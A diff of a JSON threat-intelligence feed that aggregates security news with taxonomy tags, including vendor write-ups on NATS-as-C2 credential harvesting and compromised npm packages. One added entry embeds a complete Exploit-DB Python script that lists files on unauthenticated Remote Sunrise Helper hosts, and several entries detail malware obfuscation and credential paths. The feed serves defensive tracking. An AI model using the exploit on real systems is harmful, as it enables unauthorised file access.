+          "summary": "Remote Sunrise Helper for Windows 2026.14 - Remote Code Execution",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Microsoft Windows"
+            ],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [
+              "preauth_unauth"
+            ],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_1_offensive_research"
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "3f3940c1a9",
       "priority_score": 14,
       "member_count": 1,
@@ -3171,111 +3150,6 @@
             "geographic_scope": [],
             "urgency_signals": [],
             "content_type": "uncategorized",
-            "confidence_tier": "tier_2_operator"
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "09f484b295",
-      "priority_score": 14,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [
-        "CVE-2026-33017"
-      ],
-      "taxonomy": {
-        "threat_categories": [
-          "credential_attack",
-          "malware",
-          "vulnerability_disclosure"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "AWS",
-          "GitHub"
-        ],
-        "cve_ids": [
-          "CVE-2026-33017"
-        ],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [
-          "cisa_kev",
-          "preauth_unauth"
-        ],
-        "content_type": [
-          "threat_research"
-        ],
-        "confidence_tier": [
-          "tier_2_operator"
-        ]
-      },
-      "primary": {
-        "source": "Sysdig",
-        "cohort": "detection_response_operations",
-        "title": "NATS-as-C2: Inside a new technique attackers are using to harvest cloud credentials and AI API keys",
-        "link": "https://webflow.sysdig.com/blog/nats-as-c2-inside-a-new-technique-attackers-are-using-to-harvest-cloud-credentials-and-ai-api-keys",
-        "published": "2026-05-14T00:00:00+00:00",
-        "summary": "Sysdig Threat Research Team (TRT) has identified what appears to be the first published case of a threat actor using a NATS server as command-and-control (C2) infrastructure — a technique dubbed “NATS-as-C2.” Discovered during an investigation into exploitation of CVE-2026-33017 in Langflow, the operation used cloud-native messaging infrastructure, including pub/sub orchestration and durable task queues, to coordinate a distributed credential-hunting worker pool targeting AWS and AI credentials.",
-        "full_body": "< back to blog NATS-as-C2: Inside a new technique attackers are using to harvest cloud credentials and AI API keys Published by: Michael Clark Director of Threat Research @ linkedin READ MORE RESEARCH Published: May 14, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more On May 5, 2026, the Sysdig Threat Research Team (TRT) identified a novel command-and-control (C2) technique in which a threat actor used a NATS server as C2 infrastructure. The Sysdig TRT has dubbed this technique “NATS-as-C2.” Rather than relying on traditional HTTP-based panels or chat platforms, the attacker leveraged infrastructure more commonly associated with modern distributed systems. The Sysdig TRT traced the activity to an extended exploitation attempt involving CVE-2026-33017 , an unauthenticated remote code execution (RCE) vulnerability in Langflow that was added to the CISA KEV catalog on March 25, 2026. Over roughly 30 minutes of hands-on activity, the operator at 159.89.205.184 (DigitalOcean) downloaded a Python worker and a Go binary. During this time, the Sysdig TRT captured the threat actor’s payload, exposing their coordination plane: a NATS server at 45.192.109.25:14222 running an authenticated, ACL-enforced instance. The attacker subsequently attempted to escape the container using DirtyPipe and DirtyCreds exploits. Threat actors have increasingly adopted legitimate platforms and services as covert communication channels, including Discord, Telegram, GitHub, cloud storage, and AI assistants. And the more sophisticated credential-stuffing operations published this year, including the exposed Hetzner cluster leaked on April 10, used Flask plus Socket.IO over REST. The use of a native pub/sub message broker with subject-level authorization is a notable evolution beyond either pattern. Put simply, the Sysdig TRT observed an attacker exploiting a vulnerability, installing malware, and moving laterally to establish deeper system control. What stands out is the attacker’s novel use of NATS, a messaging server normally meant for fast application communication, as their hidden C2 system. This operation gave the threat actor a more advanced, organized means through which to manage infected machines. The NATS-as-C2 tool chain The operator named the project KeyHunter, likely after the original tool designed to discover API key leaks. The initial worker download confirmed the C2 endpoint and message bus identity: === KeyHunter Python Worker === Worker ID: py-XXXXXX NATS : nats: //45.192.109.25:14222 Capabilities: [ 'scan_cde' , 'scan_web' , 'validate_aws' , 'validate_ai' ] [REGEX] Loaded 12 patterns The four declared capabilities are also the worker's NATS subscribe subjects — t ask.scan_cde , task.scan_web , task.validate_aws , and task.validate_ai — all of which were captured from the Python source. Each is a discrete monetization path: scan_cde targets Cloud Development Environment platforms (CodePen, JSFiddle, StackBlitz, CodeSandbox), with a GenericClient fallback for any URL the queue dispatches. This is shared-snippet credential harvesting, which is uncommon. scan_web scrapes an arbitrary URL. validate_aws confirms harvested AWS access keys are live by calling sts:GetCallerIdentity via boto3 and recording the returned Account, Arn, and UserId for the operator. validate_ai validates harvested LLM provider keys directly against vendor APIs. The open-source fadidevv/keyhunter project covers a similar provider set, and the operator may have copied the brand. A single worker is positioned to harvest both cloud credentials and AI API keys from the same scan output, and to confirm whether each is live before reporting back. This creates two independent revenue streams from one captured-key pipeline. Using an access control list-enforced server-side According to logs, the NATS work",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "vulnerability_disclosure",
-            "malware",
-            "credential_attack"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "AWS",
-            "GitHub"
-          ],
-          "cve_ids": [
-            "CVE-2026-33017"
-          ],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [
-            "cisa_kev",
-            "preauth_unauth"
-          ],
-          "content_type": "threat_research",
-          "confidence_tier": "tier_2_operator"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Sysdig",
-          "cohort": "detection_response_operations",
-          "title": "NATS-as-C2: Inside a new technique attackers are using to harvest cloud credentials and AI API keys",
-          "link": "https://webflow.sysdig.com/blog/nats-as-c2-inside-a-new-technique-attackers-are-using-to-harvest-cloud-credentials-and-ai-api-keys",
-          "published": "2026-05-14T00:00:00+00:00",
-          "summary": "Sysdig Threat Research Team (TRT) has identified what appears to be the first published case of a threat actor using a NATS server as command-and-control (C2) infrastructure — a technique dubbed “NATS-as-C2.” Discovered during an investigation into exploitation of CVE-2026-33017 in Langflow, the operation used cloud-native messaging infrastructure, including pub/sub orchestration and durable task queues, to coordinate a distributed credential-hunting worker pool targeting AWS and AI credentials.",
-          "taxonomy": {
-            "threat_categories": [
-              "vulnerability_disclosure",
-              "malware",
-              "credential_attack"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "AWS",
-              "GitHub"
-            ],
-            "cve_ids": [
-              "CVE-2026-33017"
-            ],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [
-              "cisa_kev",
-              "preauth_unauth"
-            ],
-            "content_type": "threat_research",
             "confidence_tier": "tier_2_operator"
           }
         }
@@ -3709,91 +3583,6 @@
       ]
     },
     {
-      "cluster_id": "7d631cf339",
-      "priority_score": 14,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "zero_day"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "telecommunications"
-        ],
-        "affected_products": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [
-          "zero_day"
-        ],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_5_chatter"
-        ]
-      },
-      "primary": {
-        "source": "Reddit r/cybersecurity",
-        "cohort": "reddit_practitioner_osint",
-        "title": "Huawei zero-day attack behind last year’s crash of Luxembourg's entire telecoms network",
-        "link": "https://www.reddit.com/r/cybersecurity/comments/1titugp/huawei_zeroday_attack_behind_last_years_crash_of/",
-        "published": "2026-05-20T18:09:58+00:00",
-        "summary": "submitted by /u/Steap-Edit [link] [comments]",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
-        "taxonomy": {
-          "threat_categories": [
-            "zero_day"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "telecommunications"
-          ],
-          "affected_products": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [
-            "zero_day"
-          ],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_5_chatter"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Reddit r/cybersecurity",
-          "cohort": "reddit_practitioner_osint",
-          "title": "Huawei zero-day attack behind last year’s crash of Luxembourg's entire telecoms network",
-          "link": "https://www.reddit.com/r/cybersecurity/comments/1titugp/huawei_zeroday_attack_behind_last_years_crash_of/",
-          "published": "2026-05-20T18:09:58+00:00",
-          "summary": "submitted by /u/Steap-Edit [link] [comments]",
-          "taxonomy": {
-            "threat_categories": [
-              "zero_day"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "telecommunications"
-            ],
-            "affected_products": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [
-              "zero_day"
-            ],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_5_chatter"
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "b625c0e6b0",
       "priority_score": 13,
       "member_count": 1,
@@ -3895,6 +3684,85 @@
             ],
             "content_type": "threat_research",
             "confidence_tier": "tier_1_primary_research"
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "fd4f2336b4",
+      "priority_score": 13,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Microsoft Windows"
+        ],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research"
+        ]
+      },
+      "primary": {
+        "source": "Exploit-DB",
+        "cohort": "offensive_vulnerability_research",
+        "title": "[local] Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing",
+        "link": "https://www.exploit-db.com/exploits/52566",
+        "published": "2026-05-15T00:00:00+00:00",
+        "summary": "Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing EDB-ID: 52566 CVE: N/A EDB Verified: Author: Chokri Hammedi Type: local Exploit: / Platform: Windows Date: 2026-05-15 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing # Date: 2026-04-20 # Exploit Author: Chokri Hammedi # Software: https://rs.ltd/latest.php?os=win # Vendor: https://rs.ltd/ # Version: 2026.14 # Tested on: Windows 10 / Windows 11 import requests, json, sys, urllib3 from urllib.parse import quote urllib3.disable_warnings() if len(sys.argv) < 2: print(f\"Usage: {sys.argv[0]} <target_ip> [path]\") print(f\"Example: {sys.argv[0]} 192.168.1.103\") print(f\"Example: {sys.argv[0]} 192.168.1.103 'C:/Users'\") print(f\"Example: {sys.argv[0]} 192.168.1.103 '%USERPROFILE%/Desktop'\") sys.exit(1) target = sys.argv[1] path = sys.argv[2] if len(sys.argv) > 2 else \"\" url = f\"https://{target}:49762\" headers = {\"X-HostName\": \"a\", \"X-ClientToken\": \"a\", \"X-HostFullModel\": \"a\"} r = requests.get(f\"{url}/api/getVersion\", verify=False, timeout=5) data = r.json() if data.get(\"requires.auth\") == False: if path: encoded = quote(path, safe='') r = requests.get(f\"{url}/api/listFiles={encoded}\", headers=headers, verify=False) else: r = requests.get(f\"{url}/api/listFiles\", headers=headers, verify=False) print(json.dumps(r.json(), indent=2)) else: print(\"[*] Not vulnerable - authentication required\") Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Microsoft Windows"
+          ],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [
+            "preauth_unauth"
+          ],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_1_offensive_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Exploit-DB",
+          "cohort": "offensive_vulnerability_research",
+          "title": "[local] Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing",
+          "link": "https://www.exploit-db.com/exploits/52566",
+          "published": "2026-05-15T00:00:00+00:00",
+          "summary": "Remote Sunrise Helper for Windows 2026.14 - Unauthenticated File/Directory Listing",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Microsoft Windows"
+            ],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [
+              "preauth_unauth"
+            ],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_1_offensive_research"
           }
         }
       ]
@@ -4429,6 +4297,106 @@
       ]
     },
     {
+      "cluster_id": "a17791a046",
+      "priority_score": 12,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "credential_attack",
+          "malware",
+          "supply_chain"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "manufacturing_industrial"
+        ],
+        "affected_products": [
+          "AWS",
+          "GitHub",
+          "Kubernetes",
+          "npm"
+        ],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Microsoft Security Blog",
+        "cohort": "threat_research_primary",
+        "title": "Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft",
+        "link": "https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/",
+        "published": "2026-05-20T17:48:44+00:00",
+        "summary": "Compromised @antv npm packages deploy the Mini Shai-Hulud payload to steal CI/CD secrets from Linux-based automation environments. The malware executes during npm install and targets credentials across GitHub, AWS, Kubernetes, Vault, npm, and 1Password platforms. The post Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft appeared first on Microsoft Security Blog .",
+        "full_body": "Share Link copied to clipboard! Tags Linux Content types Research Products and services Microsoft Defender Topics Actionable threat insights Defending against advanced tactics Microsoft has identified an active supply chain attack targeting the @antv node package manager (npm) package ecosystem. A threat actor compromised an @antv maintainer account and published malicious versions of widely used data-visualization packages, resulting in cascading downstream impact. The compromise propagated through dependency chains into libraries like echarts-for-react (which has more than 1 million weekly downloads), expanding the blast radius into CI/CD pipelines and cloud workloads across the ecosystem. The malicious payload—a ~499 KB obfuscated JavaScript file—runs silently during npm install and is purpose-built to steal credentials from GitHub Actions environments. Key capabilities observed in the payload include multi-platform credential theft (GitHub, Amazon Web Services, HashiCorp Vault, npm, Kubernetes, 1Password), GitHub Action Runner process memory scraping, privilege escalation, dual-channel data exfiltration, and Supply chain Levels for Software Artifacts (SLSA) provenance forgery. These capabilities suggest a deliberate effort to evade analysis and an apparent focus on CI/CD environments. The authors of the antv account have also since confirmed in a ticket on the repo that the situation is now resolved. Attack chain overview Figure 1. @antv npm supply chain attack flow. The @antv organization maintains charting libraries (G2, G6) embedded across dashboards and applications. The attack proceeds through: Maintainer account compromise and publication of malicious @antv package versions Downstream dependency amplification ( echarts-for-react , size-sensor , and others) Automatic payload execution through a preinstall hook during npm install Execution chain: node → shell → bun → payload (Bun runtime installed if absent) Technical analysis The payload replaces the legitimate index.js with a single-line obfuscated script. Obfuscation Layer 1: 1,732 Base64-encoded strings in a rotated array, decoded through lookup function with the shuffle key 0xa31de Layer 2: Critical strings such as command-and-control (C2) domain and env var names are encrypted with a custom PBKDF2 and SHA-256 cipher, which is decrypted at runtime. Environment gating: The payload exits immediately if it’s not running on GitHub Actions on Linux Branch avoidance: Skips the main , master , dependabot/ , renovate/ , and gh-pages when using Git API exfiltration // Layer 1: 1,732 strings in rotated array with base64 decode (function(_0x44be0e, _0x3ff020){ // Array shuffle IIFE with key 0xa31de _0x335af4['push'](_0x335af4['shift']()); })(_0x71ec, 0xa31de)); // Layer 2: PBKDF2+SHA256 runtime decryption for critical strings var e6 = \"a8269c01069452afb8a54de904e6419578d155fdbdb9e566bab8576a4266b61e\"; var t6 = \"7f44e4ba6f6a71bd0f789e7f83bd3104\"; var u5 = new du(e6, t6); // PBKDF2 cipher instance globalThis[\"f2959c600\"] = function(s) { return u5.decode(s); }; // Environment gate - exits if not GitHub Actions on Linux this['isGitHubActions'] = process.env[f2959c600('68zz23c6NGR9...')] === 'true'; this['isLinuxRunner'] = process.env[f2959c600('NhUrwwYEwYIJ...')] === 'Linux'; Credential theft The payload targets secrets across six platforms: GitHub : Extracts GITHUB_TOKEN , scans for Personal Access Tokens ( gh[op]_ ) and installation tokens ( ghs_ ), validates through /user API, and enumerates repo and org secrets. Amazon Web Services(AWS) : Queries Instance Metadata Service (169.254.169[.]254), Elastic Container Service metadata (169.254.170[.]2), reads .aws/ files, harvests env vars, and then calls SecretsManager across all regions. HashiCorp Vault : Searches 12+ token paths ( /var/run/secrets/vault/token , ~/.vault-token , and others) and connects to a local Vault at 127.0.0[.]1:8200. npm : Validates tokens using /-/whoami , exchanges OpenID Connect (OIDC) tokens for publish",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "supply_chain",
+            "malware",
+            "credential_attack"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "manufacturing_industrial"
+          ],
+          "affected_products": [
+            "AWS",
+            "Kubernetes",
+            "GitHub",
+            "npm"
+          ],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_1_primary_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Microsoft Security Blog",
+          "cohort": "threat_research_primary",
+          "title": "Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft",
+          "link": "https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/",
+          "published": "2026-05-20T17:48:44+00:00",
+          "summary": "Compromised @antv npm packages deploy the Mini Shai-Hulud payload to steal CI/CD secrets from Linux-based automation environments. The malware executes during npm install and targets credentials across GitHub, AWS, Kubernetes, Vault, npm, and 1Password platforms. The post Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft appeared first on Microsoft Security Blog .",
+          "taxonomy": {
+            "threat_categories": [
+              "supply_chain",
+              "malware",
+              "credential_attack"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "manufacturing_industrial"
+            ],
+            "affected_products": [
+              "AWS",
+              "Kubernetes",
+              "GitHub",
+              "npm"
+            ],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_1_primary_research"
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "5b620fe8c5",
       "priority_score": 12,
       "member_count": 1,
@@ -4727,97 +4695,6 @@
             "geographic_scope": [],
             "urgency_signals": [],
             "content_type": "threat_research",
-            "confidence_tier": "tier_2_operator"
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "12769a0a4d",
-      "priority_score": 12,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "AWS",
-          "Apple iOS/macOS",
-          "GitHub",
-          "Google Cloud",
-          "Kubernetes",
-          "PyPI",
-          "npm"
-        ],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_2_operator"
-        ]
-      },
-      "primary": {
-        "source": "Datadog Security Labs",
-        "cohort": "cloud_identity_infrastructure",
-        "title": "Backdoored Cemu release linked to TanStack and Mistral supply chain campaign",
-        "link": "https://securitylabs.datadoghq.com/articles/backdoored-cemu-release-teampcp-supply-chain-campaign/",
-        "published": "2026-05-14T00:00:00+00:00",
-        "summary": "We investigate how a coordinated supply chain campaign that compromised npm and PyPI packages also backdoored the official Cemu Nintendo Wii U emulator GitHub release, reaching nearly 20,000 Linux users.",
-        "full_body": "Martin McCloskey Staff Security Engineer Sebastian Obregoso Security Researcher Rory McCune Senior Advocate - Security & Compliance What happened On May 11th a coordinated supply chain campaign poisoned 170 legitimate packages across npm and PyPI within a five-hour window. SafeDep documented the notable victims, malicious versions of @tanstack/react-router (3M+ weekly downloads) pushed through compromised npm tokens alongside a direct commit to the upstream GitHub repo (79ac49eed), and a backdoored mistralai==2.4.6 slipped onto PyPI with no corresponding upstream tag. While investigating the mistralai compromise, we discovered that transformers.pyz a payload embedded in the malicious wheel was also associated with releases on the cemu-project/Cemu GitHub release page, a Nintendo Wii U emulator with no obvious relationship to Python ML SDKs. Investigation into the Cemu project While investigating transformers.pyz on VirusTotal, pivoting on its SHA256 led us to a second binary bundling the same file: Cemu-2.6-x86_64.AppImage . We confirmed this was the image hosted on the official cemu-project/Cemu GitHub release page. The Cemu v2.6 GitHub release page showing backdoored Linux assets re-uploaded by MangelSpec alongside the original macOS and Windows builds Cemu-2.6-x86_64.AppImage is a single-file Linux application bundle; under the hood it is a SquashFS image with a small ELF prefix. Extracting it laid out the bundled filesystem under squashfs-root/ . The interesting artifact lives at squashfs-root/usr/share/Cemu/scripts/startup.pyz â a path that does not exist in the legitimate Cemu build. There is no scripts/ directory in upstream Cemu and no Python interpreter in its dependency graph; the file is foreign to the project. startup.pyz is a Python zipapp: a renamed zip archive with a __main__.py entrypoint, designed to be executed by the system Python interpreter. Its sha256 ( 0f35abda19fb69430c32228465396094b866d887427bf551e353ab31256a9dd6 ) indicates byte-for-byte identical to the transformers.pyz distributed through the TanStack npm campaign. Unzipping startup.pyz reveals the campaign's working set: Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2026-05-12 09:21:46 D.... 0 0 python_mistral_cemu_files 2026-05-05 06:02:52 D.... 0 0 python_mistral_cemu_files/utilities 2026-05-03 04:24:52 ..... 0 12 python_mistral_cemu_files/utilities/__init__.py 2026-05-07 00:38:54 ..... 1565 568 python_mistral_cemu_files/utilities/crypto.py 2026-05-05 05:56:18 ..... 2411 846 python_mistral_cemu_files/utilities/aws_signer.py 2026-05-06 21:25:52 ..... 1579 554 python_mistral_cemu_files/__main__.py 2026-05-12 09:21:46 ..... 6035 2582 python_mistral_cemu_files/entrypoint.py 2026-05-07 17:07:42 ..... 2457 1150 python_mistral_cemu_files/LICENSE 2026-05-12 09:20:38 ..... 897 409 python_mistral_cemu_files/aggregate.py 2026-05-07 00:39:02 ..... 3729 1335 python_mistral_cemu_files/roulette.py 2026-05-05 06:02:42 D.... 0 0 python_mistral_cemu_files/collectors 2026-05-07 00:30:36 ..... 10499 2617 python_mistral_cemu_files/collectors/filesystem.py 2026-05-05 04:21:48 ..... 11943 3172 python_mistral_cemu_files/collectors/kubernetes.py 2026-05-07 00:32:20 ..... 4224 1445 python_mistral_cemu_files/collectors/vault.py 2026-05-06 21:22:46 ..... 7274 1953 python_mistral_cemu_files/collectors/aws.py 2026-05-03 04:24:58 ..... 6370 1891 python_mistral_cemu_files/collectors/gcp.py 2026-05-03 22:43:44 ..... 3930 947 python_mistral_cemu_files/collectors/passwords.py 2026-05-03 04:10:34 ..... 0 12 python_mistral_cemu_files/collectors/__init__.py 2026-05-03 04:24:58 ..... 7803 2178 python_mistral_cemu_files/collectors/azure.py ------------------- ----- ------------ ------------ ------------------------ 2026-05-12 09:21:46 70716 21671 16 files, 3 folders GitHub release investigation The npm and PyPI legs of this campaign were credential-driven: stolen publishing tokens used to ship malicious versions of l",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "AWS",
-            "Google Cloud",
-            "Kubernetes",
-            "GitHub",
-            "npm",
-            "PyPI",
-            "Apple iOS/macOS"
-          ],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_2_operator"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Datadog Security Labs",
-          "cohort": "cloud_identity_infrastructure",
-          "title": "Backdoored Cemu release linked to TanStack and Mistral supply chain campaign",
-          "link": "https://securitylabs.datadoghq.com/articles/backdoored-cemu-release-teampcp-supply-chain-campaign/",
-          "published": "2026-05-14T00:00:00+00:00",
-          "summary": "We investigate how a coordinated supply chain campaign that compromised npm and PyPI packages also backdoored the official Cemu Nintendo Wii U emulator GitHub release, reaching nearly 20,000 Linux users.",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "AWS",
-              "Google Cloud",
-              "Kubernetes",
-              "GitHub",
-              "npm",
-              "PyPI",
-              "Apple iOS/macOS"
-            ],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [],
-            "content_type": "uncategorized",
             "confidence_tier": "tier_2_operator"
           }
         }
@@ -5512,6 +5389,91 @@
       ]
     },
     {
+      "cluster_id": "7d631cf339",
+      "priority_score": 12,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "telecommunications"
+        ],
+        "affected_products": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [
+          "zero_day"
+        ],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_5_chatter"
+        ]
+      },
+      "primary": {
+        "source": "Reddit r/cybersecurity",
+        "cohort": "reddit_practitioner_osint",
+        "title": "Huawei zero-day attack behind last year’s crash of Luxembourg's entire telecoms network",
+        "link": "https://www.reddit.com/r/cybersecurity/comments/1titugp/huawei_zeroday_attack_behind_last_years_crash_of/",
+        "published": "2026-05-20T18:09:58+00:00",
+        "summary": "submitted by /u/Steap-Edit [link] [comments]",
+        "full_body": "",
+        "fetch_status": "fetch_failed:HTTPError",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "telecommunications"
+          ],
+          "affected_products": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [
+            "zero_day"
+          ],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_5_chatter"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Reddit r/cybersecurity",
+          "cohort": "reddit_practitioner_osint",
+          "title": "Huawei zero-day attack behind last year’s crash of Luxembourg's entire telecoms network",
+          "link": "https://www.reddit.com/r/cybersecurity/comments/1titugp/huawei_zeroday_attack_behind_last_years_crash_of/",
+          "published": "2026-05-20T18:09:58+00:00",
+          "summary": "submitted by /u/Steap-Edit [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "telecommunications"
+            ],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_5_chatter"
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "4cca4604a8",
       "priority_score": 12,
       "member_count": 2,
@@ -5863,73 +5825,6 @@
       ]
     },
     {
-      "cluster_id": "4fa65d0591",
-      "priority_score": 11,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research"
-        ]
-      },
-      "primary": {
-        "source": "Rapid7",
-        "cohort": "offensive_vulnerability_research",
-        "title": "Operationalizing CTEM Faster: Build Surface Command Dashboards in Minutes",
-        "link": "https://www.rapid7.com/blog/post/em-operationalizing-ctem-building-surface-command-dashboards",
-        "published": "2026-05-20T12:15:54+00:00",
